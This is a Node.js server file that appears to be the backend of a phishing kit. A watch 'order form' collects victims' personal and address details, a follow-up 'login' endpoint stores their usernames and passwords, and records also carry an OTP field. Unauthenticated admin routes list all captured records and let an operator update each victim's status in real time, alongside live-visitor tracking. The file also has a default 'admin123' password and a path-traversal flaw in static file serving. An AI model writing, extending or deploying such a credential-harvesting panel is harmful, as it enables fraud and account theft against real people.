const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

const mimeTypes = {
    '.html': 'text/html',
    '.css': 'text/css',
    '.js': 'application/javascript',
    '.json': 'application/json',
    '.png': 'image/png',
    '.jpg': 'image/jpeg',
    '.jpeg': 'image/jpeg',
    '.gif': 'image/gif',
    '.svg': 'image/svg+xml',
    '.ico': 'image/x-icon',
    '.webp': 'image/webp',
    '.woff': 'font/woff',
    '.woff2': 'font/woff2',
    '.ttf': 'font/ttf',
};

let requests = [];
let nextId = 1;
let liveVisitors = new Set();
let totalVisits = 0;
let todayVisits = 0;
let todayDate = new Date().toDateString();

function resetDailyIfNeeded() {
    const now = new Date().toDateString();
    if (now !== todayDate) {
        todayDate = now;
        todayVisits = 0;
    }
}

function readBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            try { resolve(JSON.parse(body)); }
            catch (e) { reject(e); }
        });
        req.on('error', reject);
    });
}

function sendJson(res, statusCode, data) {
    res.writeHead(statusCode, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(data));
}

const server = http.createServer(async (req, res) => {
    const parsedUrl = new URL(req.url, `http://localhost:${PORT}`);
    const pathname = parsedUrl.pathname;

    // --- API Routes ---

    // Admin login
    if (pathname === '/api/admin-login' && req.method === 'POST') {
        try {
            const data = await readBody(req);
            if (data.password === ADMIN_PASSWORD) {
                return sendJson(res, 200, { ok: true });
            }
            return sendJson(res, 200, { ok: false });
        } catch (e) {
            return sendJson(res, 400, { ok: false, error: 'Invalid request' });
        }
    }

    // Submit order (from order form)
    if (pathname === '/api/submit-order' && req.method === 'POST') {
        try {
            const data = await readBody(req);
            const request = {
                id: nextId++,
                name: data.name || '',
                phone: data.phone || '',
                email: data.email || '',
                delivery: data.delivery || '',
                branch: data.branch || '',
                governorate: data.governorate || '',
                city: data.city || '',
                address: data.address || '',
                watchColor: data.watchColor || '',
                username: '',
                password: '',
                otp: '',
                status: 'pending',
                createdAt: new Date().toISOString()
            };
            requests.push(request);
            return sendJson(res, 200, { ok: true, id: request.id });
        } catch (e) {
            return sendJson(res, 400, { ok: false, error: 'Invalid request' });
        }
    }

    // Submit login credentials (from login page)
    if (pathname === '/api/submit-login' && req.method === 'POST') {
        try {
            const data = await readBody(req);
            const orderId = data.orderId;
            const request = requests.find(r => r.id === orderId);
            if (request) {
                request.username = data.username || '';
                request.password = data.password || '';
            }
            return sendJson(res, 200, { ok: true });
        } catch (e) {
            return sendJson(res, 400, { ok: false, error: 'Invalid request' });
        }
    }

    // Get all requests (admin)
    if (pathname === '/api/requests' && req.method === 'GET') {
        return sendJson(res, 200, { ok: true, requests: requests });
    }

    // Update request status (admin)
    const statusMatch = pathname.match(/^\/api\/requests\/(\d+)\/status$/);
    if (statusMatch && req.method === 'POST') {
        try {
            const id = Number(statusMatch[1]);
            const data = await readBody(req);
            const request = requests.find(r => r.id === id);
            if (request) {
                request.status = data.status || 'pending';
            }
            return sendJson(res, 200, { ok: true });
        } catch (e) {
            return sendJson(res, 400, { ok: false, error: 'Invalid request' });
        }
    }

    // Live visitor count
    if (pathname === '/api/live-count' && req.method === 'GET') {
        return sendJson(res, 200, { ok: true, count: liveVisitors.size });
    }

    // Stats
    if (pathname === '/api/stats' && req.method === 'GET') {
        resetDailyIfNeeded();
        return sendJson(res, 200, { ok: true, today: todayVisits, total: totalVisits });
    }

    // Track visit
    if (pathname === '/api/track-visit' && req.method === 'POST') {
        try {
            const data = await readBody(req);
            const visitorId = data.visitorId || Math.random().toString(36).slice(2);
            liveVisitors.add(visitorId);
            resetDailyIfNeeded();
            totalVisits++;
            todayVisits++;
            setTimeout(() => liveVisitors.delete(visitorId), 60000);
            return sendJson(res, 200, { ok: true, visitorId });
        } catch (e) {
            return sendJson(res, 200, { ok: true });
        }
    }

    // Heartbeat (keep alive visitor)
    if (pathname === '/api/heartbeat' && req.method === 'POST') {
        try {
            const data = await readBody(req);
            if (data.visitorId) {
                liveVisitors.add(data.visitorId);
                setTimeout(() => liveVisitors.delete(data.visitorId), 60000);
            }
            return sendJson(res, 200, { ok: true });
        } catch (e) {
            return sendJson(res, 200, { ok: true });
        }
    }

    // --- Static Files ---
    let filePath = pathname === '/' ? '/index.html' : pathname;
    filePath = path.join(__dirname, decodeURIComponent(filePath));

    const ext = path.extname(filePath).toLowerCase();
    const contentType = mimeTypes[ext] || 'application/octet-stream';

    fs.readFile(filePath, (err, content) => {
        if (err) {
            if (err.code === 'ENOENT') {
                fs.readFile(path.join(__dirname, 'index.html'), (e, c) => {
                    if (e) {
                        res.writeHead(500);
                        res.end('Server Error');
                        return;
                    }
                    res.writeHead(200, { 'Content-Type': 'text/html' });
                    res.end(c);
                });
            } else {
                res.writeHead(500);
                res.end('Server Error');
            }
            return;
        }
        res.writeHead(200, { 'Content-Type': contentType });
        res.end(content);
    });
});

server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
